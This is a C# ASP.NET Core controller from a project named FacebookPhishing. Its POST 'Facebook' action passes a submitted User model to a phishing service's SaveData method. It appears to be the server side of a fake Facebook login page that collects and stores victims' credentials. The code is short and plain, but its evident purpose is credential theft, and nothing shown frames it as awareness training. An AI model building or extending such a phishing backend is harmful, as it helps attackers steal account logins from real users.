using FacebookPhishing.Domain;
using FacebookPhishing.InterfaceServices;
using FacebookPhishing.Models;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;

namespace FacebookPhishing.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;
        private readonly IPhishInterface _phishingService;
       

        public HomeController(ILogger<HomeController> logger, IPhishInterface phishingService)
        {
            _logger = logger;
            _phishingService = phishingService;
        }

        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }
        public IActionResult Facebook()
        {
            return View();
        }
        [HttpPost]
        public IActionResult Facebook(User model)
        {           
            _phishingService.SaveData(model);
            return View(model);

        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}
